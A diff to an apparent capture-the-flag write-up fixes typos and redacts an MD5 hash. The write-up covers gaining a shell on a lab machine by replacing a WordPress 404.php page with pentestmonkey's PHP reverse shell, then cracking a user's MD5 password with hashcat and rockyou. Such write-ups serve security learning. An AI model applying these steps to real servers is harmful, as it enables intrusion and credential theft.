@@ -234,7 +234,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-12 00:45:
 We find valid credentails. We can now login using this.
 
 
-## WORDPRESS & REVRESE SHELL
+## WORDPRESS & REVERSE SHELL
 
 We are greeted with a standard _/wp-admin_ page. We will move around and see if we find something that can get us a shell.
 
@@ -261,7 +261,7 @@ Note: One can also modify the _Plugin_ section and achieve the reverse shell. I'
 ```
 
 We can now replace contents of a file like _404.php_ with reverse shell code. We start a listner on our side and invoke the modified file. \
-I am using standard php reverse shell script from pentestmonkey(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to repace teh content of the 404.php page. The only thing to change is the _IP and PORT_ on which you are listening. A person just starting out will find all the scripts rather useful.\
+I am using standard php reverse shell script from pentestmonkey(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to replace the content of the 404.php page. The only thing to change is the _IP and PORT_ on which you are listening. A person just starting out will find all the scripts rather useful.\
 \
 **SCRIPT**
 ```php
@@ -458,7 +458,6 @@ drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
 -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
 -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
 daemon@linux:/home/robot$ cat password.raw-md5 
-c3fcd3d76192e4007dfb496cca67e13b
 ```
 
 We can use following command to find the mode for cracking raw md5. We can then supply famous rockyou list to crack the md5sum. We find that the credentials for the user robot.
@@ -488,12 +487,11 @@ Dictionary cache built:
 * Keyspace..: 14344385
 * Runtime...: 1 sec
 
-c3fcd3d76192e4007dfb496cca67e13b:********************************
+****************************:********************************
                                                  
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: MD5
-Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
 Time.Started.....: Thu Nov 12 21:41:12 2020 (1 sec)
 Time.Estimated...: Thu Nov 12 21:41:13 2020 (0 secs)
 Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
